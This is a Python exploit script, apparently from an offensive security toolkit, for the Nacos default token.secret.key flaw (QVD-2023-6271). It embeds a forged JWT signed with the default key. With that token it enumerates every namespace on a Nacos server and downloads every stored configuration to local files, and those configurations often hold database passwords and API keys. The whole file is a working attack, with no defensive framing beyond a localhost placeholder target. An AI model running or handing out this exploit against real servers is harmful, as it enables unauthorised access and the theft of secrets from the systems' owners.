import os
import json
import urllib3
import requests
from urllib import parse
from datetime import datetime
from common.logo import logo
from common.hander_random import requests_headers
urllib3.disable_warnings()

headers = requests_headers()

# 获取configurationManagement中的namespaces
def get_namespace(url, accessToken):
    params = {'accessToken': accessToken,'namespaceId': '',}
    response = requests.get(url + 'v1/console/namespaces',params=params)
    namespaces = json.loads(response.text)
    return namespaces

# 获取配置并下载到本地
def get_tenant(url, accessToken, namespace, namespaceShowName):
    params = {'dataId': '','group': '','appName': '','config_tags': '','pageNo': '1','pageSize': '10','tenant': namespace,'search': 'accurate','accessToken': accessToken,}
    response = requests.get(url + 'v1/cs/configs',params=params,headers=headers,verify=False,)
    req = json.loads(response.text)

    pagesAvailable = req['pagesAvailable']  # 页数
    
    for page in range(1,pagesAvailable + 1):
        params1 = {'dataId': '','group': '','appName': '','config_tags': '','pageNo': page,'pageSize': '10','tenant': namespace,'search': 'accurate','accessToken': accessToken,}
        response1 = requests.get(url + 'v1/cs/configs',params=params1,headers=headers,verify=False,)
        req1 = json.loads(response1.text)

        # 获取当前日期
        date = datetime.now().strftime("%Y%m%d")

        # 创建文件夹
        if namespace == "":
            namespace = namespaceShowName
        folder_name = f"{date}//{parse.urlparse(url).hostname}//{namespace}"
        folder_path = os.path.join(os.getcwd(), "output", folder_name)
        os.makedirs(folder_path, exist_ok=True)

        # 遍历 pageItems
        for i in range(len(req1["pageItems"])):
            # 获取 dataId 和 content
            item = req1["pageItems"][i]
            data_id = item["dataId"]
            content = item["content"]

            # 创建 dataId 文件并写入 content
            file_path = os.path.join(folder_path, data_id)
            with open(file_path, "w", encoding='utf-8') as file:
                file.write(content)

if __name__ == '__main__':
    logo()
    # Nacos token.secret.key默认配置(QVD-2023-6271) ： "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q"
    url = "http://localhost/nacos/"
    accessToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q"
    namespaces = get_namespace(url, accessToken)
    for i in range(len(namespaces['data'])):
        namespace = namespaces['data'][i]['namespace']
        namespaceShowName = namespaces['data'][i]['namespaceShowName']
        print(f"namespace: {namespace}, namespaceShowName: {namespaceShowName}")
        get_tenant(url, accessToken, namespace, namespaceShowName)